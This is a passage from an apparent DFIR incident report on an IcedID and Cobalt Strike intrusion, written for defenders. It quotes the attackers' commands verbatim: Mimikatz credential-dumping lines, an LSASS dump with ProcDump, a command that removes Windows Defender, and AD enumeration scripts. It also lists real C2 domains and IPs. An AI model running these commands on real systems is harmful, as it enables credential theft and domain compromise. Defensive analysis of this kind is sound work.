<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16901" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-019.png" alt width="1959" height="862" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-019.png 1959w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-019-300x132.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-019-1024x451.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-019-768x338.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-019-1536x676.png 1536w" sizes="(max-width: 1959px) 100vw, 1959px" /></a></p>
<p>On the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller. This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon.</p>
<pre class="wp-block-preformatted">ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472)
ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1
ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)</pre>
<p>The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16902" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-020.png" alt width="539" height="642" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-020.png 539w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-020-252x300.png 252w" sizes="(max-width: 539px) 100vw, 539px" /></a></p>
<h2 class="wp-block-heading" id="defense-evasion"><a href="#defense-evasion">Defense Evasion</a></h2>
<h3 class="wp-block-heading">Mark-of-the-Web Bypass</h3>
<p>The threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment. These packages are designed to evade controls such as Mark-of-the-Web restrictions.</p>
<h3 class="wp-block-heading">Windows Defender tampering</h3>
<p>On one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing.</p>
<pre class="wp-block-preformatted">powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI</pre>
<p>This command was downloaded from a remote site to a file named pon!.txt and then executed locally.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16903" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-021.png" alt width="1246" height="49" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-021.png 1246w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-021-300x12.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-021-1024x40.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-021-768x30.png 768w" sizes="(max-width: 1246px) 100vw, 1246px" /></a></p>
<h3 class="wp-block-heading">Process injection</h3>
<p>Multiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed. This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victim&#8217;s computer.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16904" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-022.png" alt width="2085" height="870" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-022.png 2085w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-022-300x125.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-022-1024x427.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-022-768x320.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-022-1536x641.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-022-2048x855.png 2048w" sizes="(max-width: 2085px) 100vw, 2085px" /></a></p>
<p>As a result, we observed abnormal winlogon.exe process behavior; winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16906" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-023.png" alt width="600" height="275" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-023.png 600w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-023-300x138.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></a></p>
<p>The injection is also visible from memory dumps. Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16905" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-024.png" alt width="1508" height="326" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-024.png 1508w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-024-300x65.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-024-1024x221.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-024-768x166.png 768w" sizes="(max-width: 1508px) 100vw, 1508px" /></a></p>
<p>Many of these beacons could also be detected in memory scanning with the <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike" target="_blank" rel="noreferrer noopener">Malpedia Cobalt Strike</a> rule. A sample of a scanning run is displayed below:</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Host</td>
<td>Process ID</td>
<td>Process Name</td>
<td>Command Line</td>
<td>Yara Rule</td>
</tr>
<tr>
<td>SERVERA</td>
<td>568</td>
<td>winlogon.exe</td>
<td>winlogon.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>SERVERA</td>
<td>4284</td>
<td>RuntimeBroker.exe</td>
<td>C:\Windows\System32\RuntimeBroker.exe -Embedding</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>SERVERB</td>
<td>9936</td>
<td>rundll32.exe</td>
<td>C:\Windows\syswow64\rundll32.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>BEACHHEAD</td>
<td>996</td>
<td>svchost.exe</td>
<td>C:\Windows\system32\svchost.exe -k DcomLaunch -p -s LSM</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>BEACHHEAD</td>
<td>1888</td>
<td>svchost.exe</td>
<td>C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilder</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>BEACHHEAD</td>
<td>2220</td>
<td>winlogon.exe</td>
<td>winlogon.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>BEACHHEAD</td>
<td>7032</td>
<td>rundll32.exe</td>
<td>C:\Windows\syswow64\rundll32.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>SERVERC</td>
<td>3328</td>
<td>rundll32.exe</td>
<td>C:\Windows\syswow64\rundll32.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
</tbody>
</table>
</figure>
<h2 class="wp-block-heading" id="credential-access"><a href="#credential-access">Credential Access</a></h2>
<p>Multiple tools and scripts were used to access and collect credentials from compromised hosts. There were several variants of Mimikatz in binary and PowerShell form:</p>
<pre class="wp-block-preformatted">"C:\ProgramData\mimikatz.exe"
"C:\ProgramData\mimikatz.exe.exe"
"C:\ProgramData\mimikatz_cryptovanniy.exe"
"C:\ProgramData\notepad.exe" "C:\ProgramData\katz.ps1</pre>
<p>Commands used to collect credentials and export to text files stored in the C:\ProgramData folder included the following:</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt;&gt; c:\programdata\mimikatz\creds.txt
C:\Windows\system32\cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit &gt; "c:\programdata\creds.txt"
C:\Windows\system32\cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" &gt; mimi.txt</pre>
<h3 class="wp-block-heading">DCSync</h3>
<p>Credentials were also dumped via DCSync using two compromised high privilege accounts. The activity was observed in Windows Security Event ID 4662, with known indicators including non-computer based account, an access mask of 0x100, and object IDs.</p>
<pre class="wp-block-preformatted">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes-All
1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes</pre>
<p>DCSync was observed across 12 events, with separate events for each object ID. It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16908" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-025.png" alt width="925" height="1043" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-025.png 925w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-025-266x300.png 266w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-025-908x1024.png 908w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-025-768x866.png 768w" sizes="(max-width: 925px) 100vw, 925px" /></a></p>
<p>For additional details, <a href="https://posts.specterops.io/entity-based-detection-engineering-with-bloodhound-enterprise-b4dce3963d66" target="_blank" rel="noopener">SpecterOps has an article covering the DCSync technique</a>.</p>
<h3 class="wp-block-heading">Code injection in LSASS</h3>
<p>Multiple injections into the LSASS process were observed on multiple hosts.</p>
<p>Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16909" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-026.png" alt width="707" height="624" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-026.png 707w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-026-300x265.png 300w" sizes="(max-width: 707px) 100vw, 707px" /></a></p>
<p>Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16910" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-027.png" alt width="550" height="98" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-027.png 550w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-027-300x53.png 300w" sizes="(max-width: 550px) 100vw, 550px" /></a></p>
<p>This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191.</p>
<pre class="wp-block-preformatted">C:\Windows\SysWOW64\rundll32.exe
  ➝ c:\windows\temp\procdump64.exe -accepteula -ma lsass.exe fwtsqmfile00.dmp</pre>
<h2 class="wp-block-heading" id="discovery"><a href="#discovery">Discovery</a></h2>
<h3 class="wp-block-heading">Classic ransomware discovery stages</h3>
<p>A number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration. Standard time discovery, domain trust discovery, workstation configuration discovery, and use of the net command to discover standard accounts and groups were observed.</p>
<p>From the IcedID malware running via Rundll32, the following LOLBAS commands were observed:</p>
<pre class="wp-block-preformatted">rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1
	➝ nltest /domain_trusts /all_trusts
	➝ nltest /domain_trusts
	➝ net view /all /domain
	➝ net view /all
	➝ net group "Domain Admins" /domain
	➝ cmd.exe /c chcp &gt;&amp;2 	
	➝ ipconfig /all 	
	➝ net config workstation
    ➝ systeminfo</pre>
<p>From Nigu.exe (Cobalt Strike beacon), the following LOLBAS commands were observed:</p>
<pre class="wp-block-preformatted">"C:\Users\[REDACTED]\AppData\Local\Temp\Nigu.exe" 
	➝ C:\Windows\system32\cmd.exe /C net group "domain admins" /domain	
	➝ C:\Windows\system32\cmd.exe /C net group "enterprise admins" /domain	
	➝ C:\Windows\system32\cmd.exe /C net time	
	➝ C:\Windows\system32\cmd.exe /C net user [REDACTED] /domain</pre>
<p>Discovery commands observed from other Cobalt Strike beacons using LOLBAS included:</p>
<pre class="wp-block-preformatted">systeminfo
netstat -anop tcp
cmd.exe /C echo %%temp%%
cmd.exe /C hostname
cmd.exe /C nslookup hostname</pre>
<h3 class="wp-block-heading">RSAT installation to enumerate domain computers properties</h3>
<p>Following the first discovery stage, the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host, which contains the ActiveDirectory PowerShell Module.</p>
<pre class="wp-block-preformatted">rundll32.exe
	➝ C:\Windows\system32\cmd.exe /C powershell.exe Add-WindowsCapability –online –Name “Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0”
    ➝ C:\Windows\system32\cmd.exe /C powershell.exe Import-Module ActiveDirectory</pre>
<p>One interesting fact to notice, the threat actors had to consult the help menu of Get-ADComputer and Export-CSV using Get-Help.</p>
<pre class="wp-block-preformatted">rundll32.exe
    ➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-Help Export-CSV
	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-Help Get-ADComputer</pre>
<p>Domain computers&#8217; properties were then enumerated using the Get-ADComputer. PowerShell cmdlet and names were exported in a CSV file named ADComputers.csv.</p>
<pre class="wp-block-preformatted">	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV "C:\ProgramData\ADComputers.csv" -NoTypeInformation
	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV -Path "C:\ProgramData\ADComputers.csv" -NoTypeInformation
	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Filter * -Properties * | Export-csv C:\ProgramData\ADComputers.csv -NoTypeInformation
	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Identity [REDACTED] -Properties *
	
	➝ C:\Windows\system32\cmd.exe /C powershell.exe get-ADcomputer -Filter * | Where-Object {$a=$_.name; $_.DistinguishedName -ne "CN=$a,OU=[REDACTED],DC=[REDACTED],DC=[REDACTED]"} | Sort-Object name | Select-Object name | Export-csv C:\ProgramData\ADComputers.csv -NoTypeInformation</pre>
<p>In addition, threat actors searched for Active Directory related DLLs in other directories:</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C dir /s *file/ Microsoft.ActiveDirectory.Management.dll
C:\Windows\system32\cmd.exe /C where /r C:\Windows\WinSxS\ *Microsoft.ActiveDirectory.Management.dll*</pre>
<h3 class="wp-block-heading">Hands on keyboard!</h3>
<p>We observed mistakes made by the threat actors during hands-on keyboard activities, these included typos and incorrect use of commands. An example of an incorrect named command was nslook up (should have been nslookup) that also incorrectly passed the username, instead of the host name.</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C nslook up [REDACTED]
C:\Windows\system32\cmd.exe /C nslookup USERFirstName UserLastName</pre>
<p>Another example, the misspelling of administrators:</p>
<pre class="wp-block-preformatted">net group administartors /domain</pre>
<p>Further examples included typos of commands:</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C net ttime</pre>
<p>Other operator errors observed included the use of Cobalt Strike commands being passed as a parameter instead of a beacon task.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16911" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-028.png" alt width="517" height="48" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-028.png 517w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-028-300x28.png 300w" sizes="(max-width: 517px) 100vw, 517px" /></a></p>
<p>The use of DCSync is documented in a previous TheDFIRReport titled &#8216;<a href="https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/" target="_blank" rel="noopener">Cobalt Strike, a Defender’s Guide</a></p>
<p>During AD enumeration, the operator made use of the PowerShell Get-help cmdlet to troubleshoot the following:</p>
<pre class="wp-block-preformatted">powershell.exe Get-Help Export-CSV
powershell.exe Get-Help Get-ADComputer</pre>
<p>Two file sharing web sites were used to access files, these were dropmefiles[.]com and file[.]io. Both of these services were accessed on day two from one Domain Controller on the network, with file downloads relating to tooling/scripts. On day three, a second Domain Controller was observed accessing the dropmefiles[.]com domain.</p>
<p><a href="https://github.com/logpresso/community/blob/main/contents/006_How_to_analyze_Internet_Explorer_Logs.md" target="_blank" rel="noreferrer noopener">Reviewing</a> the WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16912" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-029.png" alt width="1154" height="148" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-029.png 1154w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-029-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-029-1024x131.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-029-768x98.png 768w" sizes="(max-width: 1154px) 100vw, 1154px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16913" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-030.png" alt width="1293" height="55" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-030.png 1293w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-030-300x13.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-030-1024x44.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-030-768x33.png 768w" sizes="(max-width: 1293px) 100vw, 1293px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16914" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-031.png" alt width="1182" height="275" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-031.png 1182w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-031-300x70.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-031-1024x238.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-031-768x179.png 768w" sizes="(max-width: 1182px) 100vw, 1182px" /></a></p>
<p>The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117.</p>
<p>In addition, the threat actors also used Internet Explorer on the domain controller to search Bing.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16917" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-032.png" alt width="1477" height="132" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-032.png 1477w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-032-300x27.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-032-1024x92.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-032-768x69.png 768w" sizes="(max-width: 1477px) 100vw, 1477px" /></a></p>
<p>This is quite unusual to search directly on the victim&#8217;s browser. The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16918" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-033.png" alt width="847" height="367" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-033.png 847w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-033-300x130.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-033-768x333.png 768w" sizes="(max-width: 847px) 100vw, 847px" /></a></p>
<h3 class="wp-block-heading">Share discovery with Invoke-ShareFinder</h3>
<p>Other tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets. We have <a href="https://thedfirreport.com/2023/01/23/sharefinder-how-threat-actors-discover-file-shares/" target="_blank" rel="noreferrer noopener">a detailed report covering Invoke-ShareFinder</a>. In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16919" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-034.png" alt width="689" height="357" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-034.png 689w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-034-300x155.png 300w" sizes="(max-width: 689px) 100vw, 689px" /></a></p>
<h3 class="wp-block-heading">Windows Security Logs discovery</h3>
<p>Once the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16920" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-035.png" alt width="801" height="37" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-035.png 801w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-035-300x14.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-035-768x35.png 768w" sizes="(max-width: 801px) 100vw, 801px" /></a></p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C powershell -c "get-eventlog 'Security' | where {$_.Message -like '*&lt;REDACTED&gt;*' -AND 'Source Network Address'} | export-csv c:\windows\temp\events_&lt;REDACTED&gt;.txt"</pre>
<p>Executing this query would return all events in the Security log that references the specified account and with a source network address. Events returned would include process creation, logins, etc.</p>
<p>Its likely that this discovery technique forms an extension of T1033 &#8211; System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities.</p>
<h3 class="wp-block-heading">Base64 for the win</h3>
<p>Other discovery activities observed included a domain host discovery script via PowerShell. This was double base64 encoded.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16921" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-036.png" alt width="645" height="433" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-036.png 645w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-036-300x201.png 300w" sizes="(max-width: 645px) 100vw, 645px" /></a></p>
<p>Decoding this revealed another PowerShell Base64 encoded string:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16922" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-037.png" alt width="632" height="262" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-037.png 632w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-037-300x124.png 300w" sizes="(max-width: 632px) 100vw, 632px" /></a></p>
<p>The -e is short for -EncodedCommand. The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $. Refer to the Base64 cheatsheet by Forian Roth <a href="https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639" target="_blank" rel="noopener">here</a>.</p>
<p>There are many different variations of EncodedCommand, with shorthand and aliases available. Unit42 (PaloAlto) provides a <a href="https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" target="_blank" rel="noopener">good article</a> on trends and observations of PowerShell encoded commands:</p>
<p>Decoding this again using CyberChef shows the resulting PowerShell script:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16923" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-038.png" alt width="629" height="197" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-038.png 629w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-038-300x94.png 300w" sizes="(max-width: 629px) 100vw, 629px" /></a></p>
<h3 class="wp-block-heading">More tools dropped by threat actors</h3>
<p>Other binaries and scripts were dropped onto one endpoint:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16924" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-039.png" alt width="611" height="257" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-039.png 611w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-039-300x126.png 300w" sizes="(max-width: 611px) 100vw, 611px" /></a></p>
<p>The ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16925" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-040.png" alt width="253" height="354" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-040.png 253w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-040-214x300.png 214w" sizes="(max-width: 253px) 100vw, 253px" /></a></p>
<h3 class="wp-block-heading">ADGet</h3>
<p>An Active Directory collection tool named ADGet was dropped into a user&#8217;s temp folder and executed with an output filename argument. No file meta data is provided. Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16926" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-041.png" alt width="341" height="117" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-041.png 341w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-041-300x103.png 300w" sizes="(max-width: 341px) 100vw, 341px" /></a></p>
<p>ADGet is an uncommon tool, however, its function is very similar to ADfind&#8211;the key difference is that LDAP queries are not passed, they are instead coded into the binary itself.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16927" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-042.png" alt width="849" height="558" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-042.png 849w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-042-300x197.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-042-768x505.png 768w" sizes="(max-width: 849px) 100vw, 849px" /></a></p>
<p>The AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16928" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-043.png" alt width="155" height="186" /></a></p>
<p>These files can be viewed with any editor or reader that supports CSV or TSV.</p>
<h3 class="wp-block-heading">AdFind</h3>
<p>While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16929" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-044.png" alt width="1704" height="566" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-044.png 1704w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-044-300x100.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-044-1024x340.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-044-768x255.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-044-1536x510.png 1536w" sizes="(max-width: 1704px) 100vw, 1704px" /></a></p>
<p>Another batch file named AD.bat was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16930" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-045.png" alt width="385" height="22" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-045.png 385w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-045-300x17.png 300w" sizes="(max-width: 385px) 100vw, 385px" /></a></p>
<p>The AD.bat file had the following commands:</p>
<pre class="wp-block-preformatted">for /f "delims=" %%A in ('dir /s /b %WINDIR%\system32\*htable.xsl') do set "var=%%A"
adfind.exe -f (objectcategory=person) &gt; ad_users.txt
adfind.exe -f objectcategory=computer &gt; ad_computers.txt
adfind.exe -f objectcategory=computer -csv name operatingSystem &gt; ad_computers_enum.txt
adfind.exe -f (objectcategory=organizationalUnit) &gt; ad_ous.txt
adfind.exe -subnets -f (objectCategory=subnet) &gt; ad_subnets.txt
adfind.exe -f "(objectcategory=group)" &gt; ad_group.txt
adfind.exe -gcb -sc trustdmp &gt; ad_trustdmp.txt</pre>
<p>Interestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\windows\system32\wbem\en-US\htable.xsl). The HTML was never used. Its likely the code was reused from other open source pentest enumerations scripts available, such as:</p>
